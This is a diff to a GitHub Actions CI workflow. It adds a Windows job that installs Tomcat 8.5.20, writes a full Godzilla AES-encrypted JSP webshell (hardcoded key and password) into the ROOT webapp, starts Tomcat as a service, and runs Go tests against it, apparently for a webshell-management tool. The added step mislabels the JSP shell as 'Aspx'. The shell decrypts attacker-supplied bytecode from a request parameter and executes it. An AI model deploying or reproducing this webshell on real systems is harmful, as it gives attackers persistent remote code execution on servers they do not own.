@@ -97,7 +97,6 @@ jobs:
         run: |
           $directoryPath = "C:\inetpub\wwwroot\abcd"
           $filePath1 = "$directoryPath\echo.aspx"
-          $filePath2 = "$directoryPath\echo.txt"
           $content = @"
           <%@ Page Language="C#" Debug="true" %>
           <script runat="server">
@@ -114,8 +113,7 @@ jobs:
           
           # Write content to files
           $content | Out-File -FilePath $filePath1 -Encoding UTF8
-          $content | Out-File -FilePath $filePath2 -Encoding UTF8
-      - name: Configure IIS using AppCmd
+      - name: Configure IIS Listening 8087
         shell: cmd
         run: |
           @echo off
@@ -157,3 +155,72 @@ jobs:
       - name: Run Tests
         run: |
           go test -timeout 20s -run TestNewGodzillaBase64Aspx ./common/wsm
+  setup-jdk-1_8:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Set up JDK 1.8
+        uses: actions/setup-java@v4.2.1
+        with:
+          java-version: '8.0.201'
+          distribution: 'zulu'
+      - name: Download Tomcat 8.5.20
+        run: |
+          curl -o tomcat.zip https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.20/bin/apache-tomcat-8.5.20-windows-x64.zip
+          7z x tomcat.zip -oC:\tomcat
+          echo "C:\tomcat\apache-tomcat-8.5.20\bin" >> $env:GITHUB_PATH
+          echo "CATALINA_HOME=C:\tomcat\apache-tomcat-8.5.20" | Out-File -Append -Encoding utf8 $env:GITHUB_ENV
+      - name: Modify Tomcat port in server.xml
+        run: |
+          $path = "C:\tomcat\apache-tomcat-8.5.20\conf\server.xml"
+          $content = Get-Content $path -Raw
+          $newContent = $content -replace 'port="8080"', 'port="8085"'
+          Set-Content -Path $path -Value $newContent
+      - name: Deploy Godzilla Aspx Aes base64 Shell
+        run: |
+          $directoryPath = "C:\tomcat\apache-tomcat-8.5.20\webapps\ROOT"
+          $filePath = "$directoryPath\godzilla_bs64.jsp"
+          $content = @"
+          <%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+          
+          # Write content to files
+          $content | Out-File -FilePath $filePath -Encoding UTF8
+      - name: Install Tomcat as a Service
+        run: |
+          C:\tomcat\apache-tomcat-8.5.20\bin\service.bat install
+        shell: cmd
+
+      - name: Start Tomcat Service
+        run: |
+          sc start Tomcat8
+        shell: cmd
+      - name: Check Tomcat Service Status
+        run: |
+          $serviceStatus = sc query Tomcat8 | Select-String "RUNNING|START_PENDING"
+          if (-not $serviceStatus) {
+            echo "Tomcat service is not running"
+            exit 1  # Exit with an error status
+          }
+        shell: pwsh
+      # Debug
+      # - name: Display multiple Tomcat logs
+      #   run: |
+      #     $logDir = "C:\tomcat\apache-tomcat-8.5.20\logs"
+      #     Get-ChildItem $logDir -Filter *.log | ForEach-Object {
+      #       Write-Host "Showing contents of $($_.Name):"
+      #       Get-Content $_.FullName
+      #     }
+      #   shell: pwsh
+      # - name: Show netstat results
+      #   run: |
+      #     netstat -an
+      #   shell: pwsh
+      - name: Run JSP Shell Tests
+        run: |
+          go test -timeout 30s -run TestNewGodzillaBase64Jsp ./common/wsm
